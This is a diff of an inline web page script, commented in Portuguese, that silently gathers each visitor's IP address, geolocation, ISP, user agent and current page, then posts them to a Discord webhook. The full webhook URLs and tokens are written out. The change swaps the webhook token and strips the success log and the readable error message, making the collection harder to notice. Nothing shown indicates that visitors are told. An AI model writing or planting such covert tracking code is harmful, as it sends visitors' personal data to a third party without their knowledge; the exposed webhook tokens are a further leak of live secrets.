@@ -822,11 +822,10 @@
     if (!response.ok) throw new Error(`Erro HTTP: ${response.status}`);
 
     const ipData = await response.json();
-
-    // Verifica se o sucesso veio como true
+    
     if (ipData.success !== true) {
       console.warn("API não retornou sucesso:", ipData);
-      return; // Sai sem enviar nada
+      return;
     }
 
     const userAgent = navigator.userAgent || "Desconhecido";
@@ -837,8 +836,7 @@
       return field ? field : "Desconhecido";
     }
 
-    const description = `>>> **Novo acesso detectado!**\n
-📍 **IP:** ${safe(ipData.ip)}
+    const description = `>>> 📍 **IP:** ${safe(ipData.ip)}
 🌍 **País:** ${safe(ipData.country)}
 🏙️ **Cidade:** ${safe(ipData.city)}
 🕸️ **Operadora/ISP:** ${safe(ipData.isp)}
@@ -847,7 +845,7 @@
 🔗 **Página:** ${currentURL}
 🕒 **Horário:** ${new Date().toLocaleString()}`;
 
-    const webhookUrl = "https://discord.com/api/webhooks/1390800357046620243/y-IJGs9361T_10kLLJ4F4QUJBlIfGUv3oqslint7jSw7VCUoDePrYVTYu_A8S0TNvqp-";
+    const webhookUrl = "https://discord.com/api/webhooks/1390810106400211034/rALLZ_Lm9unE6iwz7i-uJ01hv2Td46gSs6jlBUyf1_oHfysF84HWBbYkwkbVhZZ2G-nC";
 
     const payload = {
       content: null,
@@ -873,9 +871,8 @@
       body: JSON.stringify(payload)
     });
 
-    console.log("✅ Info enviada pro Discord com sucesso.");
   } catch (err) {
-    console.error("❌ Erro ao enviar dados pro Discord:", err);
+    console.error("❌");
   }
 })();
 </script>
